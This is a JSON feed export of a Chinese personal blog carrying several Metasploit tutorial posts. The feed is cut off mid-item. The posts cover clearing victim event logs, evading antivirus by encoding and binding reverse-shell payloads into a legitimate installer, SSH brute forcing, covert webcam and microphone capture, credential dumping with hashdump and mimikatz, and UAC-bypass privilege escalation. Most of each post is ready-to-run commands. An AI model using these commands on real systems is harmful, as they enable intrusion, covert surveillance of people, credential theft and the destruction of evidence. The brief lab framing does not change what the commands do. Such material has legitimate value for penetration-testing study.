{
    "version": "https://jsonfeed.org/version/1",
    "title": null,
    "subtitle": "翩若浮云着霓裳，落幕鬓边皆染霜",
    "icon": "https://mangpumo.github.io/images/favicon.ico",
    "description": "欢迎来到 Mang Pumo 的个人博客!",
    "home_page_url": "https://MangPumo.github.io",
    "items": [
        {
            "id": "https://mangpumo.github.io/2023/01/12/msf%E6%B8%85%E7%90%86%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/",
            "url": "https://mangpumo.github.io/2023/01/12/msf%E6%B8%85%E7%90%86%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/",
            "title": "msf清理事件日志",
            "date_published": "2023-01-12T14:18:52.000Z",
            "content_html": "<p>再进入肉鸡执行一些操作时，windows 下记录的操作日志可在日志查看器中进行查看，可以通过运行 eventvwr 命令打开。包括了应用程序、系统、安全等模块的日志，为了不让其查到自己或知道自己的操作，则可以使用 meterpreter 的 clearev 命令来清除其日志。未清除日志前可查看系统记录的一些处理信息。</p>\n<p>![1645511582659](03 msf 清理事件日志.assets/1645511582659.png)</p>\n<p>然后在 meterpreter 下执行 clearev 命令，可以看到清除提示，分别清除了应用程序，系统和安全模块的日志记录。</p>\n<p>clearev      清理日志</p>\n<p>![1645511593151](03 msf 清理事件日志.assets/1645511593151.png)</p>\n<p>（注意 使用 clearev 命令时 需要获得靶机的 system  权限）</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/msf%E5%85%8D%E6%9D%80%E7%BC%96%E7%A0%81/",
            "url": "https://mangpumo.github.io/2023/01/12/msf%E5%85%8D%E6%9D%80%E7%BC%96%E7%A0%81/",
            "title": "msf免杀编码",
            "date_published": "2023-01-12T14:18:18.000Z",
            "content_html": "<p>杀软是如何检测出恶意代码的？<br>\n特征码、启发式恶意软件检查和行为。<br>\n免杀是做什么？<br>\n对特征进行混淆，打乱代码，避免杀毒软件查杀<br>\n免杀的基本方法有哪些？<br>\n自编码处理  自捆绑 + 编码  多重编码   接口下载式  签名伪装式</p>\n<p>针对杀毒软件的基本检测方法，我们可有以下几种方法实现免杀：</p>\n<p>改变特征码<br>\n改变行为<br>\n其它</p>\n<p>由于 msf 被各大安全厂商盯的比较紧，所以这些常规的方法免杀效果肯定是比较差的，但有时把一两种常规方法稍微结合一下就能达到比较好的免杀效果</p>\n<p>要用到的在线查毒工具 virscan 提供</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlyc2Nhbi5vcmcv\">https://www.virscan.org/</span></p>\n<h1 id=\"一-不处理payload直接生成样本进行检测\"><a class=\"anchor\" href=\"#一-不处理payload直接生成样本进行检测\">#</a> 一、不处理 payload 直接生成样本进行检测</h1>\n<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.32 LPORT=4456 -f exe -o payload1.exe</p>\n<p>![1645511560404](02 msf 编码免杀.assets/1645511560404.png)</p>\n<p>进行查毒有 41% 的杀毒软件报毒了</p>\n<p>具体查毒链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yLnZpcnNjYW4ub3JnL2xhbmd1YWdlL2VuL3JlcG9ydC8yN2VhNTNiYWI0NGUwYTAyM2I1N2MyNzk5MWYwMmNmOQ==\">https://r.virscan.org/language/en/report/27ea53bab44e0a023b57c27991f02cf9</span></p>\n<p>![1645511550808](02 msf 编码免杀.assets/1645511550808.png)</p>\n<h1 id=\"二-msf自编码处理payload生成样本进行检测\"><a class=\"anchor\" href=\"#二-msf自编码处理payload生成样本进行检测\">#</a> 二、 MSF 自编码处理 payload 生成样本进行检测</h1>\n<p>首先我们输入   msfvenom --list encoders   查看可以用编码模块</p>\n<p>![1645511543145](02 msf 编码免杀.assets/1645511543145.png)</p>\n<p>我们使用  x86/shikata_ga_nai 模块 免杀中使用频率最高的一个编码器</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai HOST=192.168.110.110  LPORT=4456 -f exe -o payload1.exe</p>\n<p>进行查毒有 37% 的杀毒软件报毒了</p>\n<p>![1645511533351](02 msf 编码免杀.assets/1645511533351.png)</p>\n<h1 id=\"三-msf自捆绑处理payload生成样本进行检测\"><a class=\"anchor\" href=\"#三-msf自捆绑处理payload生成样本进行检测\">#</a> 三、MSF 自捆绑处理 payload 生成样本进行检测</h1>\n<p>使用 msfvenom 的 - x 参数可以指定一个可执行文件，将 payload 与其捆绑</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -x UltraISO.exe -f exe -o payload2.exe</p>\n<p>![1645511525813](02 msf 编码免杀.assets/1645511525813.png)</p>\n<p>进行查毒有 37% 的杀毒软件报毒了</p>\n<p>![1645511516751](02 msf 编码免杀.assets/1645511516751.png)</p>\n<h1 id=\"四-msf自捆绑编码处理payload生成样本进行检测\"><a class=\"anchor\" href=\"#四-msf自捆绑编码处理payload生成样本进行检测\">#</a> 四、MSF 自捆绑 + 编码处理 payload 生成样本进行检测</h1>\n<p>结合第二种，第三种。编码方式我们再次生成样本</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -e x86/shikata_ga_nai -x UltraISO.exe  -i 10 -f exe -o payload3.exe</p>\n<p>![1645511507586](02 msf 编码免杀.assets/1645511507586.png)</p>\n<p>进行查毒有 31% 的杀毒软件报毒了</p>\n<p>![1645511497457](02 msf 编码免杀.assets/1645511497457.png)</p>\n<p>那我们继续增加编码次数</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -e x86/shikata_ga_nai -x UltraISO.exe  -i 20 -f exe -o payload4.exe</p>\n<p>进行查毒有 27% 的杀毒软件报毒了！</p>\n<p>![1645511487704](02 msf 编码免杀.assets/1645511487704.png)</p>\n<h1 id=\"五-msf多重编码payload生成样本进行检测\"><a class=\"anchor\" href=\"#五-msf多重编码payload生成样本进行检测\">#</a> 五、MSF 多重编码 payload 生成样本进行检测</h1>\n<p>通过管道，让 msfvenom 用不同编码器反复编码进行混淆。使用管道让 msfvenom 对攻击载荷多重编码，先用 shikata_ga_nai 编码 10 次，接着来 10 次的 alpha_upper 编码，再来 10 次的 countdown 编码，最后才生成以 payload5.exe 为模板的可执行文件。</p>\n<p>msfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=192.168.110.110 LPORT=4456 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x UltraISO.exe -f exe -o payload5.exe</p>\n<h1 id=\"六-生成shellcode使用c语言调用\"><a class=\"anchor\" href=\"#六-生成shellcode使用c语言调用\">#</a> 六、 生成 Shellcode 使用 C 语言调用</h1>\n<p>1、直接在 linux 中利用 msf 的 meterpreter 生成的文件以.c 形式文件存储，得到机器码。命令：</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.110.110 LPORT=4456 -f c &gt;c0001.c</p>\n<p>![1645511458128](02 msf 编码免杀.assets/1645511458128.png)</p>\n<p>2、改 c 文件，并编译，并加壳</p>\n<p>![1645511469800](02 msf 编码免杀.assets/1645511469800.png)</p>\n<p>随便写一个 hello world</p>\n<p>main() {<br>\nprintf(&quot;hello world\\n&quot;);<br>\n}</p>\n<p>然后编译 并加壳</p>\n<p>vmp 加壳工具</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/msf%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97/",
            "url": "https://mangpumo.github.io/2023/01/12/msf%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97/",
            "title": "msf辅助模块",
            "date_published": "2023-01-12T14:10:07.000Z",
            "content_html": "<p>说明：我们知道 msf 辅助模块有上千个，主要用于信息搜集阶段，功能包括扫描、口令猜解、敏感信息嗅探、FUZZ 测试发掘漏洞、实施网络协议欺骗等</p>\n<h1 id=\"一-怎么查询-auxiliary辅助模块\"><a class=\"anchor\" href=\"#一-怎么查询-auxiliary辅助模块\">#</a> 一、怎么查询 Auxiliary 辅助模块</h1>\n<p>我们可以通过以下命令查询所有 Auxiliary 辅助模块</p>\n<p>use auxiliary/ 或   show auxiliary</p>\n<h1 id=\"二-auxiliary辅助模块分类\"><a class=\"anchor\" href=\"#二-auxiliary辅助模块分类\">#</a> 二、 Auxiliary 辅助模块分类</h1>\n<hr>\n<h4 id=\"admin\"><a class=\"anchor\" href=\"#admin\">#</a> admin</h4>\n<hr>\n<p>/admin/android</p>\n<p>/admin/http</p>\n<p>/admin/mysql/</p>\n<p>/admin/oracle/</p>\n<p>/admin/vmware/</p>\n<p>/admin/smb/</p>\n<hr>\n<h4 id=\"dos\"><a class=\"anchor\" href=\"#dos\">#</a> dos</h4>\n<hr>\n<p>/dos/android/</p>\n<p>/dos/http/</p>\n<p>/dos/cisco/</p>\n<p>/dos/dns/</p>\n<p>/dos/smb/</p>\n<p>/dos/windows/ftp/</p>\n<hr>\n<h4 id=\"fuzzers\"><a class=\"anchor\" href=\"#fuzzers\">#</a> fuzzers</h4>\n<hr>\n<p>/fuzzers/http/</p>\n<p>/fuzzers/smb/</p>\n<p>/gather/</p>\n<hr>\n<h4 id=\"scanner\"><a class=\"anchor\" href=\"#scanner\">#</a> scanner</h4>\n<hr>\n<p>/scanner/portscan/</p>\n<p>/scanner/ftp/</p>\n<p>/scanner/http/</p>\n<p>/scanner/ssh/</p>\n<p>/scanner/smb/</p>\n<p>/scanner/vmware/</p>\n<p>/scanner/vnc/</p>\n<p>/scanner/telnet/</p>\n<p>/scanner/msyql/</p>\n<p>/scanner/ntp/</p>\n<p>/scanner/openvas/</p>\n<p>/scanner/sap/</p>\n<h4 id=\"server\"><a class=\"anchor\" href=\"#server\">#</a> server</h4>\n<p>/server/</p>\n<h1 id=\"三-通过分类查询指定模块\"><a class=\"anchor\" href=\"#三-通过分类查询指定模块\">#</a> 三、通过分类查询指定模块</h1>\n<p>通过 search 查询指定模块</p>\n<p>search type:auxiliary name:smb</p>\n<p>type： 后门跟的的模块类型   name ： 后门跟的就是要搜的模块名</p>\n<h1 id=\"四-怎么调用模块\"><a class=\"anchor\" href=\"#四-怎么调用模块\">#</a> 四、怎么调用模块</h1>\n<p>我们调一个 smb 模块演示</p>\n<p>1 查询与 SMB\t相关的辅助模块</p>\n<p>search type:auxiliary name:smb</p>\n<p>2 加载一个 ms17_010 探测模块</p>\n<p>use auxiliary/scanner/smb/smb_ms17_010</p>\n<p>3 查看载入模块需要配置的参数</p>\n<p>show options</p>\n<p>![1645511393570](01 msf 辅助模块.assets/1645511393570.png)</p>\n<p>set RHOSTS 192.168.110.110   (设定目标 IP)</p>\n<p>set THREADS 10    （如果觉得探测过慢可以增加线程，根据电脑实际性能来不要配置太多 个人建议最大 10）</p>\n<p>run （执行探测）</p>\n<p>![1645511404119](01 msf 辅助模块.assets/1645511404119.png)</p>\n<p>![1645511415106](01 msf 辅助模块.assets/1645511415106.png)</p>\n<h1 id=\"五-更多\"><a class=\"anchor\" href=\"#五-更多\">#</a> 五、更多</h1>\n<p>1 whois 查看域名或 IP 信息  （hu yi zi）</p>\n<p>whois <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5iYWlkdS5jb20=\">www.baidu.com</span></p>\n<p>whois 192.168.0.1</p>\n<p>2  利用辅助模块查找邮箱</p>\n<p>use auxiliary/gather/search_email_collector</p>\n<p>3 DNS 枚举，使用 auxiliary 模块下的 DNS 枚举模块：</p>\n<p>use auxiliary/gather/enum_dns</p>\n<p>4 ssh 爆破，使用 auxiliary 模块下的 ssh_login</p>\n<p>use /auxiliary/scanner/ssh/ssh_login</p>\n<p>set RHOSTS 192.168.1.92   (设定目标 IP)<br>\n set USERNAME root    （设定 ssh 登陆账户）<br>\nset PASS_FILE /kevin/ssh_passwd.txt   （设定暴力字典）<br>\nset THREADS 100           (线程设置为 100)<br>\n show options                   (查看更改后的参数) 12345</p>\n<p>run   开始爆破</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E6%91%84%E5%83%8F%E5%A4%B4/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E6%91%84%E5%83%8F%E5%A4%B4/",
            "title": "后渗透之调摄像头",
            "date_published": "2023-01-12T13:41:34.000Z",
            "content_html": "<h1 id=\"一-环境准备\"><a class=\"anchor\" href=\"#一-环境准备\">#</a> 一、环境准备</h1>\n<p>1 MSF-Metasploit Framework</p>\n<p>2 一台 windiows 靶机</p>\n<p>3 一台安卓设备，没有可以使用模拟器</p>\n<h1 id=\"二-实战\"><a class=\"anchor\" href=\"#二-实战\">#</a> 二、实战</h1>\n<p>靶机获取到 meterpreter 后我们可以使用  webcam 模块实现调用软，硬件摄像头</p>\n<p>webcam 模块支持命令</p>\n<table>\n<thead>\n<tr>\n<th>id</th>\n<th>模块名</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td><strong>webcam_list</strong></td>\n<td>列出靶机中的所有软，硬件摄像头列表，并编号</td>\n</tr>\n<tr>\n<td>2</td>\n<td><strong>webcam_snap</strong></td>\n<td>可调用单个软，硬件摄像头拍照，默认调用第一个摄像头</td>\n</tr>\n<tr>\n<td>3</td>\n<td><strong>webcam_stream</strong></td>\n<td>可调用单个软，硬件摄像头直播，默认调用第一个摄像头</td>\n</tr>\n</tbody>\n</table>\n<p>1  webcam_list</p>\n<p><img data-src=\"%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87.assets/1644494100592.png\" alt=\"1644494100592\"></p>\n<p>2 webcam_snap  调用单个软，硬件摄像头拍照</p>\n<table>\n<thead>\n<tr>\n<th>id</th>\n<th>参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>-h</td>\n<td>显示帮助</td>\n</tr>\n<tr>\n<td>2</td>\n<td>-i</td>\n<td>-i 1 “1” 代表调用摄像头编号</td>\n</tr>\n<tr>\n<td>3</td>\n<td>-p</td>\n<td>-p  /root &quot;root&quot; 设置存储路径</td>\n</tr>\n<tr>\n<td>4</td>\n<td>-q</td>\n<td>-q  100  &quot;100&quot; 表示存储图片的质量默认为 50</td>\n</tr>\n<tr>\n<td>5</td>\n<td>-v</td>\n<td>-v  false   -v 2 个参数  true 和  false   这个参数表示拍照后自动打开，默认参数为 true</td>\n</tr>\n</tbody>\n</table>\n<p><img data-src=\"%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87.assets/1644494089950.png\" alt=\"1644494089950\"></p>\n<p>3 webcam_stream  调用单个软，硬件摄像头直播</p>\n<table>\n<thead>\n<tr>\n<th>id</th>\n<th>参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>-h</td>\n<td>显示帮助</td>\n</tr>\n<tr>\n<td>2</td>\n<td>-d</td>\n<td>-d 100  &quot;100&quot;=100 秒   设置流持续时间为 100 秒   默认为 1800</td>\n</tr>\n<tr>\n<td>3</td>\n<td>-i</td>\n<td>-i 1 “1” 代表调用摄像头编号</td>\n</tr>\n<tr>\n<td>4</td>\n<td>-q</td>\n<td>-q 100 “100” 指流质量 默认为 50</td>\n</tr>\n<tr>\n<td>5</td>\n<td>-s</td>\n<td>-s live “live” 指流文件路径  默认输出在当前目录（注意目录不存在不会自动创建）</td>\n</tr>\n<tr>\n<td>7</td>\n<td>-f</td>\n<td>-f live “live” 指播放文件的存储地址  默认输出在当前目录</td>\n</tr>\n<tr>\n<td>8</td>\n<td>-v</td>\n<td>-v  false   -v 2 个参数  true 和  false   这个参数表示拍照后自动打开，默认参数为 true</td>\n</tr>\n</tbody>\n</table>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%9B%91%E6%8E%A7Windows/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%9B%91%E6%8E%A7Windows/",
            "title": "后渗透之远程监控Windows",
            "date_published": "2023-01-12T13:33:52.000Z",
            "content_html": "<h1 id=\"一-环境准备\"><a class=\"anchor\" href=\"#一-环境准备\">#</a> 一、环境准备</h1>\n<h4 id=\"1-rdesktop\"><a class=\"anchor\" href=\"#1-rdesktop\">#</a> 1 rdesktop</h4>\n<p>在线安装  rdesktop</p>\n<hr>\n<p>Debian,Ubuntu,kali 下使用以下命令</p>\n<p>apt-get install rdesktop</p>\n<hr>\n<p>Centos/RedHat 可以通过 yum 命令</p>\n<p>yum -y install rdesktop</p>\n<h4 id=\"2-一台windiows靶机没有物理电脑可以使用虚拟机代替\"><a class=\"anchor\" href=\"#2-一台windiows靶机没有物理电脑可以使用虚拟机代替\">#</a> 2 一台 windiows 靶机（没有物理电脑可以使用虚拟机代替）</h4>\n<h4 id=\"3-msf-metasploit-framework\"><a class=\"anchor\" href=\"#3-msf-metasploit-framework\">#</a> 3 MSF-Metasploit Framework</h4>\n<h1 id=\"二-实战\"><a class=\"anchor\" href=\"#二-实战\">#</a> 二、实战</h1>\n<p>1 使用 rdesktop 远程控制</p>\n<p>说明：rdesktop 是 linux 下支持 Windows 远程桌面连接的客户端程序，在 linux 系统下可通过它远程访问 Windows 桌面，支持多种版本。rdesktop 是 sourceforge 下支持 GPL 协议的一个开源项目，采用 RDP（Remote Desktop Protocol, 远程桌面协议），几乎可以连接 windows 的所有版本</p>\n<p>rdesktop 常用参数</p>\n<table>\n<thead>\n<tr>\n<th>id</th>\n<th>参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>-u</td>\n<td>账户名</td>\n</tr>\n<tr>\n<td>2</td>\n<td>-p</td>\n<td>密码</td>\n</tr>\n<tr>\n<td>3</td>\n<td>-a 16</td>\n<td>指使用 16 位色显示远程画面</td>\n</tr>\n<tr>\n<td>4</td>\n<td>-f</td>\n<td>全屏模式（用<strong> Ctrl+Alt+Enter</strong> 组合键退出全屏）</td>\n</tr>\n<tr>\n<td>5</td>\n<td>-g</td>\n<td>设置分辨率 如 :   -g 1024x768</td>\n</tr>\n<tr>\n<td>6</td>\n<td>rdesktop -h</td>\n<td>查看 rdesktop 使用帮助</td>\n</tr>\n</tbody>\n</table>\n<p>rdesktop -u 用户名 -p  密码  -f   IP</p>\n<p>rdesktop -u mb -p 123456 -f  -g 1024x720 192.168.110.24</p>\n<p>如果远程计算机没有启动远程功能我们可以在 meterpreter 中输入</p>\n<p>启动远程桌面协议：run post/windows/manage/enable_rdp</p>\n<hr>\n<p>2 通过 vnc 远程</p>\n<p>![1644493726723](26 后渗透远程控制.assets/1644493726723.png)</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E9%99%86%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81Windows/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E9%99%86%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81Windows/",
            "title": "后渗透之获取登陆账号密码Windows",
            "date_published": "2023-01-12T13:29:57.000Z",
            "content_html": "<h1 id=\"一-环境准备\"><a class=\"anchor\" href=\"#一-环境准备\">#</a> 一、环境准备</h1>\n<p>1 MSF-Metasploit Framework</p>\n<p>2 一台 windiows 靶机</p>\n<h1 id=\"二-实战\"><a class=\"anchor\" href=\"#二-实战\">#</a> 二、实战</h1>\n<p>首先获得一个有 SYSTEM 权限的 meterpreter</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644493974746.png\" alt=\"1644493974746\"></p>\n<p>1 抓取自动登录账户密码</p>\n<p>2 导出 SAM 数据库本地账户密码文件</p>\n<p>3 导出密码哈希</p>\n<p>4 使用 kiwi 模块获取</p>\n<hr>\n<p>1  很多人喜欢给在计算机设置自动登录 我们可以通过抓取自动登录的账户密码</p>\n<p>run windows/gather/credentials/windows_autologin</p>\n<p>如果提示这证明本机并没有配置自动登录</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644493985741.png\" alt=\"1644493985741\"></p>\n<p>2  还可以通过导出 SAM 数据库中的本地用户账号（注意需要提权到 SYSTEM）</p>\n<p>run post/windows/gather/smart_hashdump</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644493996549.png\" alt=\"1644493996549\"></p>\n<table>\n<thead>\n<tr>\n<th>用户名</th>\n<th>SID</th>\n<th>LM 哈希:</th>\n<th>NTLM 哈希 1:::</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>mb</td>\n<td>1000</td>\n<td>aad3b435b51404eeaad3b435b51404ee</td>\n<td>32ed87bdb5fdc5e9cba88547376818d4</td>\n</tr>\n</tbody>\n</table>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494007420.png\" alt=\"1644494007420\"></p>\n<p>3  使用  hashdump 获取密码（注意需要提权到 SYSTEM 才能使用）</p>\n<p>终端内输入  run hashdump</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494019182.png\" alt=\"1644494019182\"></p>\n<p>使用在线解析工具  <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY21kNS5jb20v\">https://www.cmd5.com/</span></p>\n<p>NTLM 哈希 例子：32ed87bdb5fdc5e9cba88547376818d4</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494029236.png\" alt=\"1644494029236\"></p>\n<p>4  使用 load kiwi（使用 kiwi 模块需要 system 权限）</p>\n<p>kiwi_cmd 模块可以让我们使用 mimikatz 的全部功能， mimikatz 的命令直接在 kiwi_cmd 里直接使用</p>\n<p>5.1 终端输入  load kiwi</p>\n<p>5.2 creds_all  直接获取密码</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494040171.png\" alt=\"1644494040171\"></p>\n<p>5.3 使用  kiwi_cmd sekurlsa::logonpasswords  获取密码</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644494050257.png\" alt=\"1644494050257\"></p>\n<table>\n<thead>\n<tr>\n<th>ID</th>\n<th>kiwi 参数和描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>creds_all：列举所有凭据</td>\n</tr>\n<tr>\n<td>2</td>\n<td>creds_kerberos：列举所有 kerberos 凭据</td>\n</tr>\n<tr>\n<td>3</td>\n<td>creds_msv：列举所有 msv 凭据</td>\n</tr>\n<tr>\n<td>4</td>\n<td>creds_ssp：列举所有 ssp 凭据</td>\n</tr>\n<tr>\n<td>5</td>\n<td>creds_tspkg：列举所有 tspkg 凭据</td>\n</tr>\n<tr>\n<td>6</td>\n<td>creds_wdigest：列举所有 wdigest 凭据</td>\n</tr>\n<tr>\n<td>7</td>\n<td>dcsync：通过 DCSync 检索用户帐户信息</td>\n</tr>\n<tr>\n<td>8</td>\n<td>dcsync_ntlm：通过 DCSync 检索用户帐户 NTLM 散列、SID 和 RID</td>\n</tr>\n<tr>\n<td>9</td>\n<td>golden_ticket_create：创建黄金票据</td>\n</tr>\n<tr>\n<td>10</td>\n<td>kerberos_ticket_list：列举 kerberos 票据</td>\n</tr>\n<tr>\n<td>11</td>\n<td>kerberos_ticket_purge：清除 kerberos 票据</td>\n</tr>\n<tr>\n<td>12</td>\n<td>kerberos_ticket_use：使用 kerberos 票据</td>\n</tr>\n<tr>\n<td>13</td>\n<td>kiwi_cmd：执行 mimikatz 的命令，后面接 mimikatz.exe 的命令</td>\n</tr>\n<tr>\n<td>14</td>\n<td>lsa_dump_sam：dump 出 lsa 的 SAM</td>\n</tr>\n<tr>\n<td>15</td>\n<td>lsa_dump_secrets：dump 出 lsa 的密文</td>\n</tr>\n<tr>\n<td>16</td>\n<td>password_change：修改密码</td>\n</tr>\n<tr>\n<td>17</td>\n<td>wifi_list：列出当前用户的 wifi 配置文件</td>\n</tr>\n<tr>\n<td>18</td>\n<td>wifi_list_shared：列出共享 wifi 配置文件 / 编码</td>\n</tr>\n</tbody>\n</table>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83Windows/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83Windows/",
            "title": "后渗透之提权Windows",
            "date_published": "2023-01-12T13:24:23.000Z",
            "content_html": "<h1 id=\"一-环境准备\"><a class=\"anchor\" href=\"#一-环境准备\">#</a> 一、环境准备</h1>\n<p>1 MSF-Metasploit Framework</p>\n<p>2 一台 windiows 靶机</p>\n<h1 id=\"二-实战\"><a class=\"anchor\" href=\"#二-实战\">#</a> 二、实战</h1>\n<p>1 提权方法（Windows）查看当前获得用户的权限   meterpreter 中输入： getuid</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493116225.png\" alt=\"1644493116225\"></p>\n<p>方法一、 meterpreter 中输入：getsystem</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493125642.png\" alt=\"1644493125642\"></p>\n<p>方法二、使用 msf 模块提权</p>\n<p>要想提权必须是已经拿到 meterpreter  然后将当前 meterpreter 后台 meterprerer 中输入  background</p>\n<p>1、 查看可用模块  MSF 终端中输入   search bypassuac   查看提权模块</p>\n<p>2、 选择一个适合当前系统的提权模块  我这边使用的是 win10 系统</p>\n<p>那我们使用：use  exploit/windows/local/bypassuac_windows_store_reg  尝试提权</p>\n<p>这个模块不行就换一个 use exploit/windows/local/bypassuac_sluihijack</p>\n<p>或者  use exploit/windows/local/bypassuac_dotnet_profiler</p>\n<p>3 配置模块使用参数   终端内输入： show options</p>\n<p 需要提权的session id>4 可以看到需要配置 session  终端内输入：set session </p>\n<p>5 执行提权  终端内输入：run</p>\n<p>6 获取到 meterpreter 后 我们在终端内 输入 getuid 看实际还没有提权成功  需要在还终端内在输入 getsystem 获取权限</p>\n<p>7 获取权限完成后 输入 getuid 即可看到  已经获取到 SYSTEM 最高权限了</p>\n<p><img data-src=\"%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83.assets/1644493163472.png\" alt=\"1644493163472\"></p>\n<p>看到这个证明已经将权限提升成功</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E7%94%A8%E9%9F%B3%E9%A2%91%E8%AE%BE%E5%A4%87%E5%BD%95%E9%9F%B3/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E7%94%A8%E9%9F%B3%E9%A2%91%E8%AE%BE%E5%A4%87%E5%BD%95%E9%9F%B3/",
            "title": "后渗透之调用音频设备录音",
            "date_published": "2023-01-12T13:20:15.000Z",
            "content_html": "<p>一、环境准备<br>\n MSF-Metasploit Framework<br>\n 一台安装手机或者模拟器<br>\n二、实践</p>\n<p>record_mic  包含 4 个可选参数 分别为</p>\n<p>-d  是设置录音时长的</p>\n<p>-f 设置未见路径的</p>\n<p>-h  查看帮助的</p>\n<p>-p  控制自动播放的</p>\n<p>一条简单的录音语句</p>\n<p>record_mic -d  10 -p true</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7Windows/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7Windows/",
            "title": "后渗透之创建账户Windows",
